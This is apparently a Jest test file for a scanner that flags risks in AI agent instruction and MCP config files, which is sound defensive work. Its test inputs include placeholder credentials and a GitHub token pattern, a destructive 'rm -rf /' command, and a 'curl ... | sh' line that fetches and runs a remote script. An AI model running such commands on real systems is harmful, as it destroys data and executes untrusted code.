import { scanFileRisks, applyRisks } from '../src/core/riskScanner';
import type { AgentFile } from '../src/core/types';

function makeFile(overrides: Partial<AgentFile>): AgentFile {
  return {
    type: 'generic_instruction',
    subtype: 'agents_md',
    path: 'AGENTS.md',
    title: 'AGENTS.md',
    description: '',
    metadata: {},
    risks: [],
    contentPreview: '',
    rawContent: '',
    ...overrides,
  };
}

describe('riskScanner', () => {
  it('flags api_key= as high severity', () => {
    const file = makeFile({ rawContent: 'api_key = abc123' });
    const risks = scanFileRisks(file);
    expect(risks.some((r) => r.severity === 'high' && r.category === 'possible_secret')).toBe(true);
  });

  it('flags AWS_ACCESS_KEY_ID as high severity', () => {
    const file = makeFile({ rawContent: 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7' });
    const risks = scanFileRisks(file);
    expect(risks.some((r) => r.severity === 'high')).toBe(true);
  });

  it('flags GitHub token pattern ghp_', () => {
    const file = makeFile({ rawContent: 'token: ghp_ABCDEF1234567890abcdef' });
    const risks = scanFileRisks(file);
    expect(risks.some((r) => r.category === 'possible_secret')).toBe(true);
  });

  it('flags rm -rf / as dangerous command', () => {
    const file = makeFile({ rawContent: 'run: rm -rf /' });
    const risks = scanFileRisks(file);
    expect(risks.some((r) => r.category === 'dangerous_command' && r.severity === 'high')).toBe(true);
  });

  it('flags curl | sh as dangerous command', () => {
    const file = makeFile({ rawContent: 'curl http://example.com/install.sh | sh' });
    const risks = scanFileRisks(file);
    expect(risks.some((r) => r.category === 'dangerous_command')).toBe(true);
  });

  it('flags private IP 192.168.x.x', () => {
    const file = makeFile({ rawContent: 'Server at 192.168.1.100' });
    const risks = scanFileRisks(file);
    expect(risks.some((r) => r.category === 'private_network')).toBe(true);
  });

  it('flags MCP filesystem server', () => {
    const file = makeFile({
      type: 'mcp_config',
      subtype: 'mcp_json',
      metadata: { servers: ['filesystem', 'github'] },
    });
    const risks = scanFileRisks(file);
    expect(risks.some((r) => r.category === 'mcp_risk')).toBe(true);
  });

  it('returns no risks for safe content', () => {
    const file = makeFile({ rawContent: 'This is a safe instruction file.' });
    const risks = scanFileRisks(file);
    expect(risks).toHaveLength(0);
  });

  it('applyRisks adds risks to all files', () => {
    const files = [
      makeFile({ rawContent: 'api_key = secret' }),
      makeFile({ rawContent: 'safe content', path: 'safe.md' }),
    ];
    const result = applyRisks(files);
    expect(result[0].risks.length).toBeGreaterThan(0);
    expect(result[1].risks).toHaveLength(0);
  });
});
